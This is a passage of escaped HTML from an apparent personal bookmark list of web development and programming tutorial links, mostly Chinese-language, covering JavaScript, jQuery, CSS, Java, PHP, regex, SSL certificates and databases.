PIXNET ::<br><a href=\"http://fecbob.pixnet.net/blog/post/43286053-%5Bjava%5D-%E8%AE%80%E5%8F%96src%E4%B8%8B%E7%9A%84%E8%A8%AD%E5%AE%9A%E6%AA%94%7C\" target=\"_blank\" rel=\"noopener\">http://fecbob.pixnet.net/blog/post/43286053-%5Bjava%5D-%E8%AE%80%E5%8F%96src%E4%B8%8B%E7%9A%84%E8%A8%AD%E5%AE%9A%E6%AA%94%7C</a></p>\n<p>Phpcubes.com<br><a href=\"http://www.phpcubes.com/how-to-shift-htdocs-folder-of-xampp-in-another-drive.html\" target=\"_blank\" rel=\"noopener\">http://www.phpcubes.com/how-to-shift-htdocs-folder-of-xampp-in-another-drive.html</a></p>\n<p>XAMPP 網頁伺服器架站工具設定與使用教學 | PcSetting Blog<br><a href=\"https://www.pcsetting.com/devtools/54?page=0%2C0\" target=\"_blank\" rel=\"noopener\">https://www.pcsetting.com/devtools/54?page=0%2C0</a></p>\n<p>Papa Parse - Powerful CSV Parser for JavaScript<br><a href=\"http://papaparse.com/\" target=\"_blank\" rel=\"noopener\">http://papaparse.com/</a></p>\n<p>CSS - CSS 框架<br><a href=\"http://zh-tw.learnlayout.com/frameworks.html\" target=\"_blank\" rel=\"noopener\">http://zh-tw.learnlayout.com/frameworks.html</a></p>\n<p>轉載：逐字的 utf8 轉 big5 @ 右腦 想去環遊世界 :: 痞客邦 PIXNET ::<br><a href=\"http://yoonow.pixnet.net/blog/post/11141571-%E8%BD%89%E8%BC%89%EF%BC%9A%E9%80%90%E5%AD%97%E7%9A%84utf8%E8%BD%89big5\" target=\"_blank\" rel=\"noopener\">http://yoonow.pixnet.net/blog/post/11141571-%E8%BD%89%E8%BC%89%EF%BC%9A%E9%80%90%E5%AD%97%E7%9A%84utf8%E8%BD%89big5</a></p>\n<p>[PHP]utf8 轉 big5 之方法 - PHP 程式 學習 筆記本<br><a href=\"http://calos-tw.blogspot.tw/2008/04/phputf8big5.html\" target=\"_blank\" rel=\"noopener\">http://calos-tw.blogspot.tw/2008/04/phputf8big5.html</a></p>\n<p>頁面載入發生問題<br><a href=\"http://www.ddhigh.com/2014/09/php-website-auto-update/\" target=\"_blank\" rel=\"noopener\">http://www.ddhigh.com/2014/09/php-website-auto-update/</a></p>\n<p>【CSS FAQ】偽元素 (pseudo element) 和偽類 (pseudo class) 差在哪？ – 字串小豬<br><a href=\"https://stringpiggy.hpd.io/pseudo-element-pseudo-class-difference/\" target=\"_blank\" rel=\"noopener\">https://stringpiggy.hpd.io/pseudo-element-pseudo-class-difference/</a></p>\n<p><a href=\"http://blog.miniasp.com/post/2011/04/26/jQuery-get-form-value-Checkbox-Radio.aspx\" target=\"_blank\" rel=\"noopener\">http://blog.miniasp.com/post/2011/04/26/jQuery-get-form-value-Checkbox-Radio.aspx</a><br><a href=\"http://blog.miniasp.com/post/2011/04/26/jQuery-get-form-value-Checkbox-Radio.aspx\" target=\"_blank\" rel=\"noopener\">http://blog.miniasp.com/post/2011/04/26/jQuery-get-form-value-Checkbox-Radio.aspx</a></p>\n<p>程式扎記: [ Java 小學堂 ] 多線程設計模式 : 線程的共享互斥與 synchronized 介紹<br><a href=\"http://puremonkey2010.blogspot.tw/2010/08/java-synchronized.html\" target=\"_blank\" rel=\"noopener\">http://puremonkey2010.blogspot.tw/2010/08/java-synchronized.html</a></p>\n<p><a href=\"http://bioankeyang.blogspot.com/2015/04/javaregular-expression.html\" target=\"_blank\" rel=\"noopener\">http://bioankeyang.blogspot.com/2015/04/javaregular-expression.html</a><br><a href=\"http://bioankeyang.blogspot.com/2015/04/javaregular-expression.html\" target=\"_blank\" rel=\"noopener\">http://bioankeyang.blogspot.com/2015/04/javaregular-expression.html</a></p>\n<p><a href=\"http://weisnote.blogspot.com/2011/12/java-regex.html\" target=\"_blank\" rel=\"noopener\">http://weisnote.blogspot.com/2011/12/java-regex.html</a><br><a href=\"http://weisnote.blogspot.com/2011/12/java-regex.html\" target=\"_blank\" rel=\"noopener\">http://weisnote.blogspot.com/2011/12/java-regex.html</a></p>\n<p>GiveMePasS’s Android 惡補筆記: 如何使用正規表示法-3<br><a href=\"http://givemepass.blogspot.tw/2012/03/3.html\" target=\"_blank\" rel=\"noopener\">http://givemepass.blogspot.tw/2012/03/3.html</a></p>\n<p>腦子備份: Regular Expression: Regex 所使用的符號彙整<br><a href=\"http://milkrsvs.blogspot.tw/2013/04/regular-expression-regex.html\" target=\"_blank\" rel=\"noopener\">http://milkrsvs.blogspot.tw/2013/04/regular-expression-regex.html</a></p>\n<p>頁面載入發生問題<br><a href=\"https://free.com.tw/ssl-for-free/\" target=\"_blank\" rel=\"noopener\">https://free.com.tw/ssl-for-free/</a></p>\n<p>Let’s Encrypt 的 SSL 憑證安裝 - Tsung’s Blog<br><a href=\"https://blog.longwin.com.tw/2015/11/let-encrypt-ssl-certificate-setup-2015/\" target=\"_blank\" rel=\"noopener\">https://blog.longwin.com.tw/2015/11/let-encrypt-ssl-certificate-setup-2015/</a></p>\n<p>Let’s Encrypt 使用說明 (非官方)<br><a href=\"https://letsencrypt.tw/\" target=\"_blank\" rel=\"noopener\">https://letsencrypt.tw/</a></p>\n<p>javascript - What is the difference between String.slice and String.substring? - Stack Overflow<br><a href=\"http://stackoverflow.com/questions/2243824/what-is-the-difference-between-string-slice-and-string-substring\" target=\"_blank\" rel=\"noopener\">http://stackoverflow.com/questions/2243824/what-is-the-difference-between-string-slice-and-string-substring</a></p>\n<p>被遺忘的瞇瞇: javascript - showmodaldialog 與 parent 資料傳遞<br><a href=\"http://sheauren.blogspot.tw/2011/12/javascript-showmodaldialogparent.html\" target=\"_blank\" rel=\"noopener\">http://sheauren.blogspot.tw/2011/12/javascript-showmodaldialogparent.html</a></p>\n<p>Javascript 单元测试框架 Qunit 和 Jasmine 的比较 – Benjamin<br><a href=\"http://www.zuojj.com/archives/440.html\" target=\"_blank\" rel=\"noopener\">http://www.zuojj.com/archives/440.html</a></p>\n<p>實作 Cross-Origin Resource Sharing (CORS) 解決 Ajax 發送跨網域存取 Request - Soul &amp; Shell Blog<br><a href=\"https://blog.toright.com/\" target=\"_blank\" rel=\"noopener\">https://blog.toright.com/</a><br>posts/3205/%E5%AF%A6%E4%BD%9C-cross-origin-resource-sharing-cros-%E8%A7%A3%E6%B1%BA-ajax-%E7%99%BC%E9%80%81%E8%B7%A8%E7%B6%B2%E5%9F%9F%E5%AD%98%E5%8F%96-request.html<br>js-stackoverflow-highest-votes/unittest-tools-in-javascript.md at master · simongong/js-stackoverflow-highest-votes<br><a href=\"https://github.com/simongong/js-stackoverflow-highest-votes/blob/master/questions11-20/unittest-tools-in-javascript.md\" target=\"_blank\" rel=\"noopener\">https://github.com/simongong/js-stackoverflow-highest-votes/blob/master/questions11-20/unittest-tools-in-javascript.md</a></p>\n<p>hank7444/qunitTutorialTW: it is a traditional chinese qunit tutorial for web frond-end developers.<br><a href=\"https://github.com/hank7444/qunitTutorialTW\" target=\"_blank\" rel=\"noopener\">https://github.com/hank7444/qunitTutorialTW</a></p>\n<p>dwqs/blog: My New Blog’s Address. Welcome to star<br><a href=\"https://github.com/dwqs/blog\" target=\"_blank\" rel=\"noopener\">https://github.com/dwqs/blog</a></p>\n<p>JAVA 筆記：Thread 多工執行緒 @ 來喝杯 JAVA 咖啡 :: 痞客邦 PIXNET ::<br><a href=\"http://yaya741228.pixnet.net/blog/post/76633527-java%E7%AD%86%E8%A8%98%EF%BC%9Athread-%E5%A4%9A%E5%B7%A5%E5%9F%B7%E8%A1%8C%E7%B7%92\" target=\"_blank\" rel=\"noopener\">http://yaya741228.pixnet.net/blog/post/76633527-java%E7%AD%86%E8%A8%98%EF%BC%9Athread-%E5%A4%9A%E5%B7%A5%E5%9F%B7%E8%A1%8C%E7%B7%92</a></p>\n<p>Hatena Blog<br><a href=\"http://blog.hatena.ne.jp/login?blog=http%3A%2F%2Fknt45.hatenablog.com%2Fentry%2F20120810%2F1344608033\" target=\"_blank\" rel=\"noopener\">http://blog.hatena.ne.jp/login?blog=http%3A%2F%2Fknt45.hatenablog.com%2Fentry%2F20120810%2F1344608033</a></p>\n<p>javascript で月初、月末取得 - Qiita<br><a href=\"http://qiita.com/su_mi/items/2f086817a4dd0b05f304\" target=\"_blank\" rel=\"noopener\">http://qiita.com/su_mi/items/2f086817a4dd0b05f304</a></p>\n<p>java-一个月的第一天和最后一天 - - ITeye 技术网站<br><a href=\"http://stevenjohn.iteye.com/blog/1062672\" target=\"_blank\" rel=\"noopener\">http://stevenjohn.iteye.com/blog/1062672</a></p>\n<p>VITO の 學習筆記: 函式<br><a href=\"http://vito-note.blogspot.tw/2014/08/blog-post_10.html\" target=\"_blank\" rel=\"noopener\">http://vito-note.blogspot.tw/2014/08/blog-post_10.html</a></p>\n<p>(Javascript) Lazy Function Definition | Chui-Wen Chiu’s Note<br><a href=\"https://chuiwenchiu.wordpress.com/2007/08/15/javascript-lazy-function-definition/\" target=\"_blank\" rel=\"noopener\">https://chuiwenchiu.wordpress.com/2007/08/15/javascript-lazy-function-definition/</a></p>\n<p>Forsource<br><a href=\"http://forsourcecode.blogspot.com/search?updated-max=2014-02-05T02:07:00-08:00&amp;max-results=7\" target=\"_blank\" rel=\"noopener\">http://forsourcecode.blogspot.com/search?updated-max=2014-02-05T02:07:00-08:00&amp;max-results=7</a></p>\n<p>Javascript ES6 - (Let + Const) ~ Marc Talk<br><a href=\"https://ccw1986.blogspot.com/2016/03/javascript-es6-let-const.html\" target=\"_blank\" rel=\"noopener\">https://ccw1986.blogspot.com/2016/03/javascript-es6-let-const.html</a></p>\n<p><a href=\"http://xination.pixnet.net/blog/post/23298242-%E5%BF%83%E5%BE%97----%E9%8D%B5%E7%9B%A4%E7%AC%A6%E8%99%9F%E4%B8%8A%E7%9A%84%E8%8B%B1%E6%96%87%E8%AC%9B%E6%B3%95\" target=\"_blank\" rel=\"noopener\">http://xination.pixnet.net/blog/post/23298242-%E5%BF%83%E5%BE%97----%E9%8D%B5%E7%9B%A4%E7%AC%A6%E8%99%9F%E4%B8%8A%E7%9A%84%E8%8B%B1%E6%96%87%E8%AC%9B%E6%B3%95</a><br><a href=\"http://xination.pixnet.net/blog/post/23298242-%E5%BF%83%E5%BE%97----%E9%8D%B5%E7%9B%A4%E7%AC%A6%E8%99%9F%E4%B8%8A%E7%9A%84%E8%8B%B1%E6%96%87%E8%AC%9B%E6%B3%95\" target=\"_blank\" rel=\"noopener\">http://xination.pixnet.net/blog/post/23298242-%E5%BF%83%E5%BE%97----%E9%8D%B5%E7%9B%A4%E7%AC%A6%E8%99%9F%E4%B8%8A%E7%9A%84%E8%8B%B1%E6%96%87%E8%AC%9B%E6%B3%95</a></p>\n<p>撒母耳日誌: [ES2015 學習筆記] 區塊變數: let<br><a href=\"http://hebrewjudges.blogspot.tw/2015/05/es6-let.html\" target=\"_blank\" rel=\"noopener\">http://hebrewjudges.blogspot.tw/2015/05/es6-let.html</a></p>\n<p>定義 JavaScript 函數（Functions）的各種方式 - G. T. Wang<br><a href=\"https://blog.gtwang.org/programming/defining-javascript-functions/\" target=\"_blank\" rel=\"noopener\">https://blog.gtwang.org/programming/defining-javascript-functions/</a></p>\n<p>Javascript – Hoisting | Majesty<br><a href=\"https://nicole929chan.wordpress.com/2015/09/25/javascript-hoisting/\" target=\"_blank\" rel=\"noopener\">https://nicole929chan.wordpress.com/2015/09/25/javascript-hoisting/</a></p>\n<p>Variable and Function Hoisting in JavaScript - A Drip of JavaScript<br><a href=\"http://adripofjavascript.com/blog/drips/variable-and-function-hoisting\" target=\"_blank\" rel=\"noopener\">http://adripofjavascript.com/blog/drips/variable-and-function-hoisting</a></p>\n<p>頁面載入發生問題<br><a href=\"http://feed.hjue.me/articles/detail/2015-06-22/553936/javascript-string-jquery\" target=\"_blank\" rel=\"noopener\">http://feed.hjue.me/articles/detail/2015-06-22/553936/javascript-string-jquery</a></p>\n<p>[程式][jquery] 自己的第一個 JQuery Plugin! Hello World。(Part_01) @ 四處流浪的阿基。I am Vagrant Walker :: 痞客邦 PIXNET ::<br><a href=\"http://expect7.pixnet.net/blog/post/38085270-%5B%E7%A8%8B%E5%BC%8F%5D%5Bjquery%5D-%E8%87%AA%E5%B7%B1%E7%9A%84%E7%AC%AC%E4%B8%80%E5%80%8Bjquery-plugin!-hello-worl\" target=\"_blank\" rel=\"noopener\">http://expect7.pixnet.net/blog/post/38085270-%5B%E7%A8%8B%E5%BC%8F%5D%5Bjquery%5D-%E8%87%AA%E5%B7%B1%E7%9A%84%E7%AC%AC%E4%B8%80%E5%80%8Bjquery-plugin!-hello-worl</a></p>\n<p>JavaScript: 正規表達式 RegExp 應用（String, RegExp Method） | =ChenTsu=<br><a href=\"https://chentsu.wordpress.com/2014/03/04/javascript-%E6%AD%A3%E8%A6%8F%E8%A1%A8%E9%81%94%E5%BC%8F-regexp-%E6%87%89%E7%94%A8%EF%BC%88string-regexp-method%EF%BC%89/\" target=\"_blank\" rel=\"noopener\">https://chentsu.wordpress.com/2014/03/04/javascript-%E6%AD%A3%E8%A6%8F%E8%A1%A8%E9%81%94%E5%BC%8F-regexp-%E6%87%89%E7%94%A8%EF%BC%88string-regexp-method%EF%BC%89/</a></p>\n<p>为什么不要使用 eval - JavaScript 秘密花园 - 极客学院 Wiki<br><a href=\"http://wiki.jikexueyuan.com/project/javascript-garden/core/eval.html\" target=\"_blank\" rel=\"noopener\">http://wiki.jikexueyuan.com/project/javascript-garden/core/eval.html</a></p>\n<p>jQuery.extend 的用法 - 黑暗執行緒<br><a href=\"http://blog.darkthread.net/post-2009-03-01-jquery-extend.aspx\" target=\"_blank\" rel=\"noopener\">http://blog.darkthread.net/post-2009-03-01-jquery-extend.aspx</a></p>\n<p>Java 8 New API Tips<br><a href=\"https://ingramchen.io/blog/2014/04/java-8-new-api-tips.html\" target=\"_blank\" rel=\"noopener\">https://ingramchen.io/blog/2014/04/java-8-new-api-tips.html</a></p>\n<p>Javascript - 淺談 this 與 Closure - 黑暗執行緒<br><a href=\"http://blog.darkthread.net/blogs/darkthreadtw/archive/2009/03/11/js-this-and-closure.aspx\" target=\"_blank\" rel=\"noopener\">http://blog.darkthread.net/blogs/darkthreadtw/archive/2009/03/11/js-this-and-closure.aspx</a></p>\n<p>[译]JavaScript 中的两个 0 - 紫云飞 - 博客园<br><a href=\"http://www.cnblogs.com/ziyunfei/archive/2012/12/10/2777099.html\" target=\"_blank\" rel=\"noopener\">http://www.cnblogs.com/ziyunfei/archive/2012/12/10/2777099.html</a></p>\n<p>Top 10 free database tools for sys admins<br><a href=\"https://techtalk.gfi.com/top-10-free-database-tools-for-sys-admins/\" target=\"_blank\" rel=\"noopener\">https://techtalk.gfi.com/top-10-free-database-tools-for-sys-admins/</a></p>\n<p>Lamb &amp; Vampire: DB2 心得分享<br><a href=\"http://lambvampire.blogspot.tw/2009/01/db2.html\" target=\"_blank\" rel=\"noopener\">http://lambvampire.blogspot.tw/2009/01/db2.html</a></p>\n<p>RUN!PC ｜精選文章｜開發技術｜初探 ECMAScript 6 (上)<br><a href=\"http://www.runpc.com.tw/content/content.aspx?id=109836\" target=\"_blank\" rel=\"noopener\">http://www.runpc.com.tw/content/content.aspx?id=109836</a></p>\n<p>let - JavaScript | MDN<br><a href=\"https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/let\" target=\"_blank\" rel=\"noopener\">https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/let</a></p>\n<p>Web Scripting Simplified for JavaScript &amp; TypeScript<br><a href=\"https://www.genuitec.com/tech/web-scripting/\" target=\"_blank\" rel=\"noopener\">https://www.genuitec.com/tech/web-scripting/</a></p>\n<p>Protecting objects in JavaScript<br><a href=\"http://2ality.com/2013/08/protecting-objects.html\" target=\"_blank\" rel=\"noopener\">http://2ality.com/2013/08/protecting-objects.html</a></p>\n<p>JavaScript 日期及時間、取得某月天數、毫秒轉換成日期<br><a href=\"http://www.eion.com.tw/Blogger/?Pid=1148\" target=\"_blank\" rel=\"noopener\">http://www.eion.com.tw/Blogger/?Pid=1148</a></p>\n<p>JavaScript Date Formats<br><a href=\"https://www.w3schools.com/js/js_date_formats.asp\" target=\"_blank\" rel=\"noopener\">https://www.w3schools.com/js/js_date_formats.asp</a></p>\n<p>小爪哇的初發: JavaScript 上的同名函數陷阱！！<br><a href=\"http://ace33022.blogspot.tw/2010/10/javascript.html\" target=\"_blank\" rel=\"noopener\">http://ace33022.blogspot.tw/2010/10/javascript.html</a></p>\n<p>Collections.EMPTY_LIST 和 Collections.emptyList()简单使用体会 - 知行天下 - ITeye 技术网站<br><a href=\"http://inter12.iteye.com/blog/1023761\" target=\"_blank\" rel=\"noopener\">http://inter12.iteye.com/blog/1023761</a></p>\n<p>ECMAScript Language Specification - ECMA-262 Edition 5.1<br><a href=\"http://www.ecma-international.org/ecma-262/5.1/#sec-15.9.1.15\" target=\"_blank\" rel=\"noopener\">http://www.ecma-international.org/ecma-262/5.1/#sec-15.9.1.15</a></p>\n<p>D3js 如何兼容 IE8<br><a href=\"https://www.douban.com/group/topic/38381270/\" target=\"_blank\" rel=\"noopener\">https://www.douban.com/group/topic/38381270/</a></p>\n<p><a href=\"http://blog.miniasp.com/post/2009/10/29/The-six-versions-that-let-DOM-focus-using-jQuery.aspx\" target=\"_blank\" rel=\"noopener\">http://blog.miniasp.com/post/2009/10/29/The-six-versions-that-let-DOM-focus-using-jQuery.aspx</a><br><a href=\"http://blog.miniasp.com/post/2009/10/29/The-six-versions-that-let-DOM-focus-using-jQuery.aspx\" target=\"_blank\" rel=\"noopener\">http://blog.miniasp.com/post/2009/10/29/The-six-versions-that-let-DOM-focus-using-jQuery.aspx</a></p>\n<p>網頁設計資源彙整 - Web Design Resources<br><a href=\"https://simular.co/resources/\" target=\"_blank\" rel=\"noopener\">https://simular.co/resources/</a></p>\n<p>JWorld@TW Java 論壇 - break 與 continue 的標籤用法<br><a href=\"https://www.javaworld.com.tw/jute/post/view?age=0&amp;bid=29&amp;ppg=1&amp;sty=1&amp;id=64117&amp;tpg=1\" target=\"_blank\" rel=\"noopener\">https://www.javaworld.com.tw/jute/post/view?age=0&amp;bid=29&amp;ppg=1&amp;sty=1&amp;id=64117&amp;tpg=1</a></p>\n<p>Shiny<br><a href=\"https://blog.shinychang.net/\" target=\"_blank\" rel=\"noopener\">https://blog.shinychang.net/</a></p>\n<p>Sublime Text 2: The Best Editor in 2012 - @ChingHanHo<br><a href=\"http://blog.chh.tw/posts/sublime-text-2-the-best-editor-in-2012/\" target=\"_blank\" rel=\"noopener\">http://blog.chh.tw/posts/sublime-text-2-the-best-editor-in-2012/</a></p>\n<p>rtfd/readthedocs.org: source code to readthedocs.org<br><a href=\"https://github.com/rtfd/readthedocs.org\" target=\"_blank\" rel=\"noopener\">https://github.com/rtfd/readthedocs.org</a></p>\n<p>spitfire-sidra/git-tutorial: Git 版本控制教學<br><a href=\"https://github.com/spitfire-sidra/git-tutorial\" target=\"_blank\" rel=\"noopener\">https://github.com/spitfire-sidra/git-tutorial</a></p>\n<p>sublime text3 前端常用 plugin 整理 « 弱弱前端碎碎念<br><a href=\"http://heyyou.logdown.com/posts/220319-sublime-front-end-plugin-sorting\" target=\"_blank\" rel=\"noopener\">http://heyyou.logdown.com/posts/220319-sublime-front-end-plugin-sorting</a></p>\n<p>精通編輯器！Sublime Text 2 – Plugins 好用插件整理 | =ChenTsu=<br><a href=\"https://chentsu.wordpress.com/2014/01/09/sublime-text-2-plugins-%E5%A5%BD%E7%94%A8%E6%8F%92%E4%BB%B6%E6%95%B4%E7%90%86/\" target=\"_blank\" rel=\"noopener\">https://chentsu.wordpress.com/2014/01/09/sublime-text-2-plugins-%E5%A5%BD%E7%94%A8%E6%8F%92%E4%BB%B6%E6%95%B4%E7%90%86/</a></p>\n<p>What’s the best way to build a string of delimited items in Java? - Stack Overflow<br><a href=\"http://stackoverflow.com/questions/63150/whats-the-best-way-to-build-a-string-of-delimited-items-in-java\" target=\"_blank\" rel=\"noopener\">http://stackoverflow.com/questions/63150/whats-the-best-way-to-build-a-string-of-delimited-items-in-java</a></p>\n<p>JWorld@TW Java 論壇 - 給新手 - 使用 StringTokenizer 分離字串<br><a href=\"https://www.javaworld.com.tw/jute/post/view?bid=29&amp;id=14489&amp;sty=3\" target=\"_blank\" rel=\"noopener\">https://www.javaworld.com.tw/jute/post/view?bid=29&amp;id=14489&amp;sty=3</a></p>\n<p>[note] 如何用 PHP 定時抓網頁或 Facebook 資料 « Vanishing Point<br><a href=\"http://vanishingpoint.logdown.com/posts/164616/how-to-use-php-timed-grab-web-pages-or-facebook-data\" target=\"_blank\" rel=\"noopener\">http://vanishingpoint.logdown.com/posts/164616/how-to-use-php-timed-grab-web-pages-or-facebook-data</a></p>\n<p>StringTokenizer 與 split( ) 的差別 - 程式學習筆記<br><a href=\"https://sites.google.com/site/chengshixuexipingtai/java/stringtokenizer-yu-split-de-cha-bie\" target=\"_blank\" rel=\"noopener\">https://sites.google.com/site/chengshixuexipingtai/java/stringtokenizer-yu-split-de-cha-bie</a></p>\n<p>jsp - Difference Between import and class.forName in java - Stack Overflow<br><a href=\"http://stackoverflow.com/questions/19674752/difference-between-import-and-class-forname-in-java\" target=\"_blank\" rel=\"noopener\">http://stackoverflow.com/questions/19674752/difference-between-import-and-class-forname-in-java</a></p>\n<p>static 類別成員<br><a href=\"https://openhome.cc/Gossip/Java/Static.html\" target=\"_blank\" rel=\"noopener\">https://openhome.cc/Gossip/Java/Static.html</a></p>\n<p>HTML 表格欄寬分配實驗 - 黑暗執行緒<br><a href=\"http://blog.darkthread.net/post-2014-03-20-missing-column.aspx\" target=\"_blank\" rel=\"noopener\">http://blog.darkthread.net/post-2014-03-20-missing-column.aspx</a></p>\n<p>html - Why text-align doesn’t work in colgroup? - Stack Overflow<br><a href=\"http://stackoverflow.com/questions/5447957/why-text-align-doesnt-work-in-colgroup\" target=\"_blank\" rel=\"noopener\">http://stackoverflow.com/questions/5447957/why-text-align-doesnt-work-in-colgroup</a></p>\n<p>Equivalent of LIMIT for DB2 - Stack Overflow<br><a href=\"http://stackoverflow.com/questions/3885193/equivalent-of-limit-for-db2\" target=\"_blank\" rel=\"noopener\">http://stackoverflow.com/questions/3885193/equivalent-of-limit-for-db2</a></p>\n<p>壞掉的印表機 - 設計、生活、態度: [CSS Hack] Google chrome CSS hack 快速修正所有瀏覽器技巧<br><a href=\"http://amos-lee.blogspot.tw/2010/11/css-hack-chrome-css-hack.html\" target=\"_blank\" rel=\"noopener\">http://amos-lee.blogspot.tw/2010/11/css-hack-chrome-css-hack.html</a></p>\n<p>關於 Checkbox Click 事件的小發現 - 黑暗執行緒<br><a href=\"http://blog.darkthread.net/post-2009-05-29-something-about-js-event.aspx\" target=\"_blank\" rel=\"noopener\">http://blog.darkthread.net/post-2009-05-29-something-about-js-event.aspx</a></p>\n<p>【卜維丰】避免子物件的 onclick 事件同時引發父物件事件<br><a href=\"http://audi.tw/Blog/Javascript/javascript-onclick-e.target.event-srcElement.asp\" target=\"_blank\" rel=\"noopener\">http://audi.tw/Blog/Javascript/javascript-onclick-e.target.event-srcElement.asp</a></p>\n<p>javascript - jQuery.click() vs onClick - Stack Overflow<br><a href=\"http://stackoverflow.com/questions/12627443/jquery-click-vs-onclick\" target=\"_blank\" rel=\"noopener\">http://stackoverflow.com/questions/12627443/jquery-click-vs-onclick</a></p>\n<p>javascript - 好用的 route hashchange 类似 history.js 思路 - SegmentFault<br><a href=\"https://segmentfault.com/q/1010000000627461\" target=\"_blank\" rel=\"noopener\">https://segmentfault.com/q/1010000000627461</a></p>\n<p>javascript reduce() forEach() map() 小紀錄 | 胖胖喵的筆記本 - 點部落<br><a href=\"https://dotblogs.com.tw/mobile_net/2016/05/13/091724\" target=\"_blank\" rel=\"noopener\">https://dotblogs.com.tw/mobile_net/2016/05/13/091724</a></p>\n<p>一些關於前端 Framework 的想法（下） – Medium<br><a href=\"https://medium.com/@tomchentw/framework-a3befb7db904\" target=\"_blank\" rel=\"noopener\">https://medium.com/@tomchentw/framework-a3befb7db904</a></p>\n<p>CSS display: inline vs inline-block - Stack Overflow<br><a href=\"http://stackoverflow.com/questions/9189810/css-display-inline-vs-inline-block\" target=\"_blank\" rel=\"noopener\">http://stackoverflow.com/questions/9189810/css-display-inline-vs-inline-block</a></p>\n<p><a href=\"http://blog.miniasp.com/post/2009/04/20/Use-CSS-table-layout-property-to-speed-up-table-rendering.aspx\" target=\"_blank\" rel=\"noopener\">http://blog.miniasp.com/post/2009/04/20/Use-CSS-table-layout-property-to-speed-up-table-rendering.aspx</a><br><a href=\"http://blog.miniasp.com/post/2009/04/20/Use-CSS-table-layout-property-to-speed-up-table-rendering.aspx\" target=\"_blank\" rel=\"noopener\">http://blog.miniasp.com/post/2009/04/20/Use-CSS-table-layout-property-to-speed-up-table-rendering.aspx</a></p>\n<p>CSS 文字的換行 - OXXO.STUDIO<br><a href=\"http://www.oxxostudio.tw/articles/201406/css-word-break.html\" target=\"_blank\" rel=\"noopener\">http://www.oxxostudio.tw/articles/201406/css-word-break.html</a></p>\n<p>Details of the object model - JavaScript | MDN<br><a href=\"https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Details_of_the_Object_Model\" target=\"_blank\" rel=\"noopener\">https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Details_of_the_Object_Model</a></p>\n<p>你真的了解 word-wrap 和 word-break 的区别吗？ - 无双 - 博客园<br><a href=\"http://www.cnblogs.com/2050/archive/2012/08/10/2632256.html\" target=\"_blank\" rel=\"noopener\">http://www.cnblogs.com/2050/archive/2012/08/10/2632256.html</a></p>\n<p>html - div vertical align middle css - Stack Overflow<br><a href=\"http://stackoverflow.com/questions/18649106/div-vertical-align-middle-css\" target=\"_blank\" rel=\"noopener\">http://stackoverflow.com/questions/18649106/div-vertical-align-middle-css</a></p>\n<p>Underscore – WEB 前端开发 - 专注前端开发，关注用户体验<br><a href=\"http://www.css88.com/archives/tag/underscore\" target=\"_blank\" rel=\"noopener\">http://www.css88.com/archives/tag/underscore</a></p>\n<p>jquery - difference between :first and :first-child not clear - Stack Overflow<br><a href=\"http://stackoverflow.com/questions/2946205/difference-between-first-and-first-child-not-clear\" target=\"_blank\" rel=\"noopener\">http://stackoverflow.com/questions/2946205/difference-between-first-and-first-child-not-clear</a></p>\n<p>頁面載入發生問題<br><a href=\"http://www.zhangxinxu.com/wordpress/2011/06/css3%E9%80%89%E6%8B%A9%E5%99%A8nth-child%E5%92%8Cnth-of-type%E4%B9%8B%E9%97%B4%E7%9A%84%E5%B7%AE%E5%BC%82/\" target=\"_blank\" rel=\"noopener\">http://www.zhangxinxu.com/wordpress/2011/06/css3%E9%80%89%E6%8B%A9%E5%99%A8nth-child%E5%92%8Cnth-of-type%E4%B9%8B%E9%97%B4%E7%9A%84%E5%B7%AE%E5%BC%82/</a></p>\n<p>CSS3 選擇器「:nth-child()」與「:nth-of-type()」用法大不同|梅問題．教學網<br><a href=\"https://www.minwt.com/webdesign-dev/css/10885.html\" target=\"_blank\" rel=\"noopener\">https://www.minwt.com/webdesign-dev/css/10885.html</a></p>\n<p>jQuery 1.7 筆記 - 黑暗執行緒<br><a href=\"http://blog.darkthread.net/post-2011-11-07-jquery-1-7-release.aspx\" target=\"_blank\" rel=\"noopener\">http://blog.darkthread.net/post-2011-11-07-jquery-1-7-release.aspx</a></p>\n<p>404 Not Found | Peggy Blog!<br><a href=\"http://blog.rx836.tw/blog/jquery-html-forms/\" target=\"_blank\" rel=\"noopener\">http://blog.rx836.tw/blog/jquery-html-forms/</a></p>\n<p>Edit fiddle - JSFiddle<br><a href=\"http://jsfiddle.net/UQsKh/1/\" target=\"_blank\" rel=\"noopener\">http://jsfiddle.net/UQsKh/1/</a></p>\n<p>Python 爬虫的工具列表 - Python - 伯乐在线<br><a href=\"http://python.jobbole.com/82633/\" target=\"_blank\" rel=\"noopener\">http://python.jobbole.com/82633/</a></p>\n<p>XMLTABLE by example, Part 1: Retrieving XML data in relational format<br><a href=\"https://www.ibm.com/developerworks/data/library/techarticle/dm-0708nicola/\" target=\"_blank\" rel=\"noopener\">https://www.ibm.com/developerworks/data/library/techarticle/dm-0708nicola/</a></p>\n<p>搞清楚 Javascript this 和 jQuery \\$.proxy() | 化繁為簡<br><a href=\"https://zwjian.wordpress.com/2011/10/16/javascript_this_and_jquery_proxy/\" target=\"_blank\" rel=\"noopener\">https://zwjian.wordpress.com/2011/10/16/javascript_this_and_jquery_proxy/</a></p>\n<p>arrays - Javascript call() &amp; apply() vs bind()? - Stack Overflow<br><a href=\"http://stackoverflow.com/questions/15455009/javascript-call-apply-vs-bind\" target=\"_blank\" rel=\"noopener\">http://stackoverflow.com/questions/15455009/javascript-call-apply-vs-bind</a></p>\n<p>jQuery 中\\$.proxy()的原理和使用 - 令狐葱 ★ - 博客园<br><a href=\"http://www.cnblogs.com/jiji262/archive/2013/04/25/3043459.html\" target=\"_blank\" rel=\"noopener\">http://www.cnblogs.com/jiji262/archive/2013/04/25/3043459.html</a></p>\n<p>mrkt 的程式學習筆記: jQuery 對下拉選單 DropDownList 的操作 - 1<br><a href=\"http://kevintsengtw.blogspot.com/2011/09/jquery-dropdownlist-1.html\" target=\"_blank\" rel=\"noopener\">http://kevintsengtw.blogspot.com/2011/09/jquery-dropdownlist-1.html</a></p>\n<p>jQuery insertAfter vs. .after vs. .appendTo vs. .append - JSFiddle<br><a href=\"http://jsfiddle.net/designaroni/b33tL7hu/\" target=\"_blank\" rel=\"noopener\">http://jsfiddle.net/designaroni/b33tL7hu/</a></p>\n<p>JQuery 中 html、append、appendTo、after、insertAfter、before、insertBefore、empty、remove 系列方法的使用。 - 